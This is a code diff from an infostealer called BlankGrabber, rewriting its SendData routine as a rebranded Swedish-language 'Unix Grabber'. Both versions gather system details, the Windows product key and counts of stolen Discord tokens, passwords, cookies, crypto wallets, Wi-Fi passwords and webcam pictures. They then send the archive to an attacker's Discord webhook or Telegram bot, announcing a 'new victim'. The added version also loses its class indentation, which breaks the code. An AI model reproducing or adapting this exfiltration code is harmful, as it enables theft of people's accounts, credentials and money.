@@ -1297,74 +1297,74 @@ class BlankGrabber:
                     Logger.error('Failed to upload to anonfiles')
                     return None
 
-    def SendData(self) -> None:
-        Logger.info('Sending data to C2')
-        extention = self.CreateArchive()
-        if not os.path.isfile(self.ArchivePath):
-            raise FileNotFoundError('Failed to create archive')
-        filename = 'Blank-%s.%s' % (os.getlogin(), extention)
-        computerName = os.getenv('computername') or 'Unable to get computer name'
-        computerOS = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()
-        computerOS = computerOS[2].strip() if len(computerOS) >= 2 else 'Unable to detect OS'
-        totalMemory = subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()
-        totalMemory = str(int(int(totalMemory[1]) / 1000000000)) + ' GB' if len(totalMemory) >= 1 else 'Unable to detect total memory'
-        uuid = subprocess.run('wmic csproduct get uuid', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()
-        uuid = uuid[1].strip() if len(uuid) >= 1 else 'Unable to detect UUID'
-        cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output=True, shell=True).stdout.decode(errors='ignore').strip() or 'Unable to detect CPU'
-        gpu = subprocess.run('wmic path win32_VideoController get name', capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()
-        gpu = gpu[2].strip() if len(gpu) >= 2 else 'Unable to detect GPU'
-        productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output=True, shell=True).stdout.decode(errors='ignore').strip() or 'Unable to get product key'
-        http = PoolManager(cert_reqs='CERT_NONE')
-        try:
-            r: dict = json.loads(http.request('GET', 'http://ip-api.com/json/?fields=225545').data.decode(errors='ignore'))
-            if r.get('status') != 'success':
-                raise Exception('Failed')
-            data = f"\nIP: {r['query']}\nRegion: {r['regionName']}\nCountry: {r['country']}\nTimezone: {r['timezone']}\n\n{'Cellular Network:'.ljust(20)} {(chr(9989) if r['mobile'] else chr(10062))}\n{'Proxy/VPN:'.ljust(20)} {(chr(9989) if r['proxy'] else chr(10062))}"
-            if len(r['reverse']) != 0:
-                data += f"\nReverse DNS: {r['reverse']}"
-        except Exception:
-            ipinfo = '(Unable to get IP info)'
-        else:
-            ipinfo = data
-        system_info = f'Computer Name: {computerName}\nComputer OS: {computerOS}\nTotal Memory: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nProduct Key: {productKey}'
-        collection = {'Discord Accounts': self.DiscordTokensCount, 'Passwords': self.PasswordsCount, 'Cookies': len(self.Cookies), 'History': self.HistoryCount, 'Autofills': self.AutofillCount, 'Roblox Cookies': self.RobloxCookiesCount, 'Telegram Sessions': self.TelegramSessionsCount, 'Common Files': self.CommonFilesCount, 'Wallets': self.WalletsCount, 'Wifi Passwords': self.WifiPasswordsCount, 'Webcam': self.WebcamPicturesCount, 'Minecraft Sessions': self.MinecraftSessions, 'Epic Session': 'Yes' if self.EpicStolen else 'No', 'Steam Session': 'Yes' if self.SteamStolen else 'No', 'Uplay Session': 'Yes' if self.UplayStolen else 'No', 'Growtopia Session': 'Yes' if self.GrowtopiaStolen else 'No', 'Screenshot': 'Yes' if self.ScreenshotTaken else 'No', 'System Info': 'Yes' if self.SystemInfoStolen else 'No'}
-        grabbedInfo = '\n'.join([key + ' : ' + str(value) for key, value in collection.items()])
-        match Settings.C2[0]:
-            case 0:
-                image_url = 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png'
-                payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'Blank Grabber', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'url': 'https://github.com/Blank-c/Blank-Grabber', 'color': 34303, 'footer': {'text': 'Grabbed by Blank Grabber | https://github.com/Blank-c/Blank-Grabber'}, 'thumbnail': {'url': image_url}}], 'username': 'Blank Grabber', 'avatar_url': image_url}
-                if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20:
-                    url = self.UploadToExternalService(self.ArchivePath, filename)
-                    if url is None:
-                        raise Exception('Failed to upload to external service')
-                else:
-                    url = None
-                fields = dict()
-                if url:
-                    payload['content'] += ' | Archive : %s' % url
-                else:
-                    fields['file'] = (filename, open(self.ArchivePath, 'rb').read())
-                fields['payload_json'] = json.dumps(payload).encode()
-                http.request('POST', Settings.C2[1], fields=fields)
-            case 1:
-                payload = {'caption': f'<b>Blank Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 'parse_mode': 'HTML'}
-                if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 40:
-                    url = self.UploadToExternalService(self.ArchivePath, filename)
-                    if url is None:
-                        raise Exception('Failed to upload to external service')
-                else:
-                    url = None
-                fields = dict()
-                if url:
-                    payload['text'] = payload['caption'] + '\n\nArchive : %s' % url
-                    method = 'sendMessage'
-                else:
-                    fields['document'] = (filename, open(self.ArchivePath, 'rb').read())
-                    method = 'sendDocument'
-                token, chat_id = Settings.C2[1].split('$')
-                fields.update(payload)
-                fields.update({'chat_id': chat_id})
-                http.request('POST', 'https://api.telegram.org/bot%s/%s' % (token, method), fields=fields)
+def SendData(self) -> None:
+    Logger.info('Skickar data till C2')
+    extention = self.CreateArchive()
+    if not os.path.isfile(self.ArchivePath):
+        raise FileNotFoundError('Misslyckades att skapa arkiv')
+    filename = 'Unix-%s.%s' % (os.getlogin(), extention)
+    computerName = os.getenv('computername') or 'Kunde inte hämta datornamn'
+    computerOS = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()
+    computerOS = computerOS[2].strip() if len(computerOS) >= 2 else 'Kunde inte identifiera operativsystem'
+    totalMemory = subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()
+    totalMemory = str(int(int(totalMemory[1]) / 1000000000)) + ' GB' if len(totalMemory) >= 1 else 'Kunde inte identifiera totalt minne'
+    uuid = subprocess.run('wmic csproduct get uuid', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()
+    uuid = uuid[1].strip() if len(uuid) >= 1 else 'Kunde inte identifiera UUID'
+    cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output=True, shell=True).stdout.decode(errors='ignore').strip() or 'Kunde inte identifiera CPU'
+    gpu = subprocess.run('wmic path win32_VideoController get name', capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()
+    gpu = gpu[2].strip() if len(gpu) >= 2 else 'Kunde inte identifiera GPU'
+    productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output=True, shell=True).stdout.decode(errors='ignore').strip() or 'Kunde inte hämta produktnyckel'
+    http = PoolManager(cert_reqs='CERT_NONE')
+    try:
+        r: dict = json.loads(http.request('GET', 'http://ip-api.com/json/?fields=225545').data.decode(errors='ignore'))
+        if r.get('status') != 'success':
+            raise Exception('Misslyckades')
+        data = f"\nIP: {r['query']}\nRegion: {r['regionName']}\nLand: {r['country']}\nTidszon: {r['timezone']}\n\n{'Mobilnätverk:'.ljust(20)} {(chr(9989) if r['mobile'] else chr(10062))}\n{'Proxy/VPN:'.ljust(20)} {(chr(9989) if r['proxy'] else chr(10062))}"
+        if len(r['reverse']) != 0:
+            data += f"\nOmvänd DNS: {r['reverse']}"
+    except Exception:
+        ipinfo = '(Kunde inte hämta IP-info)'
+    else:
+        ipinfo = data
+    system_info = f'Datornamn: {computerName}\nOperativsystem: {computerOS}\nTotalt minne: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nProduktnyckel: {productKey}'
+    collection = {'Discord-konton': self.DiscordTokensCount, 'Lösenord': self.PasswordsCount, 'Kakor': len(self.Cookies), 'Historik': self.HistoryCount, 'Autofyllningar': self.AutofillCount, 'Roblox-kakor': self.RobloxCookiesCount, 'Telegram-sessioner': self.TelegramSessionsCount, 'Vanliga filer': self.CommonFilesCount, 'Plånböcker': self.WalletsCount, 'WiFi-lösenord': self.WifiPasswordsCount, 'Webbkamera': self.WebcamPicturesCount, 'Minecraft-sessioner': self.MinecraftSessions, 'Epic-session': 'Ja' if self.EpicStolen else 'Nej', 'Steam-session': 'Ja' if self.SteamStolen else 'Nej', 'Uplay-session': 'Ja' if self.UplayStolen else 'Nej', 'Growtopia-session': 'Ja' if self.GrowtopiaStolen else 'Nej', 'Skärmdump': 'Ja' if self.ScreenshotTaken else 'Nej', 'Systeminfo': 'Ja' if self.SystemInfoStolen else 'Nej'}
+    grabbedInfo = '\n'.join([key + ' : ' + str(value) for key, value in collection.items()])
+    match Settings.C2[0]:
+        case 0:
+            image_url = 'https://i.postimg.cc/QNQjtFV8/Ofr-lse.jpg'  # Uppdaterad bild-URL
+            payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'Unix Grabber', 'description': f'**__Systeminfo__\n```autohotkey\n{system_info}```\n__IP-info__```prolog\n{ipinfo}```\n__Samlad info__```js\n{grabbedInfo}```**', 'url': 'https://github.com/Unix-Grabber', 'color': 34303, 'footer': {'text': 'Samlad av Unix Grabber | https://github.com/Unix-Grabber'}, 'thumbnail': {'url': image_url}}], 'username': 'Unix Grabber', 'avatar_url': image_url}
+            if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20:
+                url = self.UploadToExternalService(self.ArchivePath, filename)
+                if url is None:
+                    raise Exception('Misslyckades att ladda upp till extern tjänst')
+            else:
+                url = None
+            fields = dict()
+            if url:
+                payload['content'] += ' | Arkiv : %s' % url
+            else:
+                fields['file'] = (filename, open(self.ArchivePath, 'rb').read())
+            fields['payload_json'] = json.dumps(payload).encode()
+            http.request('POST', Settings.C2[1], fields=fields)
+        case 1:
+            payload = {'caption': f'<b>Unix Grabber</b> har fångat ett nytt offer: <b>{os.getlogin()}</b>\n\n<b>IP-info</b>\n<code>{ipinfo}</code>\n\n<b>Systeminfo</b>\n<code>{system_info}</code>\n\n<b>Samlad info</b>\n<code>{grabbedInfo}</code>'.strip(), 'parse_mode': 'HTML'}
+            if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 40:
+                url = self.UploadToExternalService(self.ArchivePath, filename)
+                if url is None:
+                    raise Exception('Misslyckades att ladda upp till extern tjänst')
+            else:
+                url = None
+            fields = dict()
+            if url:
+                payload['text'] = payload['caption'] + '\n\nArkiv : %s' % url
+                method = 'sendMessage'
+            else:
+                fields['document'] = (filename, open(self.ArchivePath, 'rb').read())
+                method = 'sendDocument'
+            token, chat_id = Settings.C2[1].split('$')
+            fields.update(payload)
+            fields.update({'chat_id': chat_id})
+            http.request('POST', 'https://api.telegram.org/bot%s/%s' % (token, method), fields=fields)
 if os.name == 'nt':
     Logger.info('Process started')
     if Settings.HideConsole:
